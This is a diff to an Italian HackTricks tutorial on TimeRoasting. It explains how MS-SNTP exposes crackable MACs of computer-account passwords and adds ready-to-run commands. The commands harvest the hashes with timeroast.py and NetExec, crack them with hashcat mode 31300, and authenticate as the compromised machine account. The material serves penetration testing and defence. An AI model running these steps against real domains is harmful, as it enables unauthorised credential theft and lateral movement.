@@ -2,39 +2,58 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-timeRoasting, la causa principale è il meccanismo di autenticazione obsoleto lasciato da Microsoft nella sua estensione ai server NTP, noto come MS-SNTP. In questo meccanismo, i client possono utilizzare direttamente l'Identificatore Relativo (RID) di qualsiasi account computer, e il controller di dominio utilizzerà l'hash NTLM dell'account computer (generato da MD4) come chiave per generare il **Message Authentication Code (MAC)** del pacchetto di risposta.
+TimeRoasting sfrutta l'estensione di autenticazione legacy MS-SNTP. In MS-SNTP, un client può inviare una richiesta di 68 byte che incorpora qualsiasi RID di computer account; il domain controller usa l'hash NTLM (MD4) del computer account come chiave per calcolare una MAC sulla risposta e la restituisce. Gli attacker possono raccogliere queste MS-SNTP MACs in modo non autenticato e crackarle offline (Hashcat mode 31300) per recuperare le password dei computer account.
 
-Gli attaccanti possono sfruttare questo meccanismo per ottenere valori hash equivalenti di account computer arbitrari senza autenticazione. Chiaramente, possiamo utilizzare strumenti come Hashcat per il brute-forcing.
-
-Il meccanismo specifico può essere visualizzato nella sezione 3.1.5.1 "Comportamento della Richiesta di Autenticazione" della [documentazione ufficiale di Windows per il protocollo MS-SNTP](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf).
-
-Nel documento, la sezione 3.1.5.1 tratta del Comportamento della Richiesta di Autenticazione.
+Vedi la sezione 3.1.5.1 "Authentication Request Behavior" e la 4 "Protocol Examples" nella spec ufficiale MS-SNTP per i dettagli.
 ![](../../images/Pasted%20image%2020250709114508.png)
-Si può vedere che quando l'elemento ADM ExtendedAuthenticatorSupported è impostato su `false`, il formato Markdown originale viene mantenuto.
+Quando l'elemento ExtendedAuthenticatorSupported ADM è false, il client invia una richiesta di 68 byte e incorpora il RID nei 31 bit meno significativi del Key Identifier subfield dell'authenticator.
 
->Citato nell'articolo originale：
->>Se l'elemento ADM ExtendedAuthenticatorSupported è falso, il client DEVE costruire un messaggio di Richiesta NTP Client. La lunghezza del messaggio di Richiesta NTP Client è di 68 byte. Il client imposta il campo Authenticator del messaggio di Richiesta NTP Client come descritto nella sezione 2.2.1, scrivendo i 31 bit meno significativi del valore RID nei 31 bit meno significativi del sotto-campo Key Identifier dell'autenticatore, e poi scrivendo il valore Key Selector nel bit più significativo del sotto-campo Key Identifier.
+> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.
 
-Nella sezione 4 del documento Esempi di Protocollo punto 3
+Da sezione 4 (Protocol Examples):
 
->Citato nell'articolo originale：
->>3. Dopo aver ricevuto la richiesta, il server verifica che la dimensione del messaggio ricevuto sia di 68 byte. Se non lo è, il server scarta la richiesta (se la dimensione del messaggio non è uguale a 48 byte) o la tratta come una richiesta non autenticata (se la dimensione del messaggio è di 48 byte). Supponendo che la dimensione del messaggio ricevuto sia di 68 byte, il server estrae il RID dal messaggio ricevuto. Il server lo utilizza per chiamare il metodo NetrLogonComputeServerDigest (come specificato nella sezione 3.5.4.8.2 di [MS-NRPC]) per calcolare i crypto-checksum e selezionare il crypto-checksum basato sul bit più significativo del sotto-campo Key Identifier dal messaggio ricevuto, come specificato nella sezione 3.2.5. Il server quindi invia una risposta al client, impostando il campo Key Identifier a 0 e il campo Crypto-Checksum al crypto-checksum calcolato.
+> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.
 
-Secondo la descrizione nel documento ufficiale di Microsoft sopra, gli utenti non hanno bisogno di alcuna autenticazione; devono solo compilare il RID per avviare una richiesta, e poi possono ottenere il checksum crittografico. Il checksum crittografico è spiegato nella sezione 3.2.5.1.1 del documento.
+Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere crackato offline, consentendo il roasting attack.
 
->Citato nell'articolo originale：
->>Il server recupera il RID dai 31 bit meno significativi del sotto-campo Key Identifier del campo Authenticator del messaggio di Richiesta NTP Client. Il server utilizza il metodo NetrLogonComputeServerDigest (come specificato nella sezione 3.5.4.8.2 di [MS-NRPC]) per calcolare i crypto-checksum con i seguenti parametri di input:
->>>![](../../images/Pasted%20image%2020250709115757.png)
+## Come attaccare
 
-Il checksum crittografico è calcolato utilizzando MD5, e il processo specifico può essere consultato nel contenuto del documento. Questo ci dà l'opportunità di eseguire un attacco di roasting.
-
-## come attaccare
-
-Citato in https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
-
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Script di Timeroasting di Tom Tervoort
-```
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - script Timeroasting di Tom Tervoort
+```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
 ```
+---
+
+## Attacco pratico (unauth) con NetExec + Hashcat
+
+- NetExec può enumerare e raccogliere MACs MS-SNTP per RIDs dei computer senza autenticazione e stampare hash $sntp-ms$ pronti per il cracking:
+```bash
+# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
+netexec smb <dc_fqdn_or_ip> -M timeroast
+# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
+```
+- Crack offline con Hashcat mode 31300 (MS-SNTP MAC):
+```bash
+hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
+# or let recent hashcat auto-detect; keep RIDs with --username for convenience
+```
+Il cleartext recuperato corrisponde alla password di un computer account. Prova direttamente a usarlo come machine account usando Kerberos (-k) quando NTLM è disabilitato:
+```bash
+# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
+netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
+```
+Suggerimenti operativi
+- Verificare la sincronizzazione dell'ora prima di Kerberos: `sudo ntpdate <dc_fqdn>`
+- Se necessario, generare krb5.conf per il realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
+- Mappare gli RIDs sui principals successivamente tramite LDAP/BloodHound, una volta ottenuto un foothold autenticato.
+
+## Riferimenti
+
+- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
+- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
+- [NetExec – official docs](https://www.netexec.wiki/)
+- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 {{#include ../../banners/hacktricks-training.md}}
